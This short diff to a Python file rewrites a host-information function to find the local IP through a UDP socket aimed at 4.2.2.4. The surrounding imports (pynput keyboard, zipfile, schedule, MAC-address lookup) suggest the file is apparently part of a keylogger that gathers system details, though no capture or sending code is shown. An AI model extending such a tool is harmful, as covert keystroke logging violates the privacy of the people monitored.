@@ -13,6 +13,7 @@ import zipfile
 import os
 import schedule
 from typing import List
+import socket
 from pynput import keyboard
 from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
@@ -70,7 +71,9 @@ def get_current_epoc_time() -> float:
 def get_host_name_ip() -> str:
     try:
         host_name = gethostname()
-        host_ip = gethostbyname(host_name)
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("4.2.2.4", 80))
+        host_ip = s.getsockname()[0]
         return f'{host_ip}\nHostname: {host_name}'
     except:
         return 'Unknown'
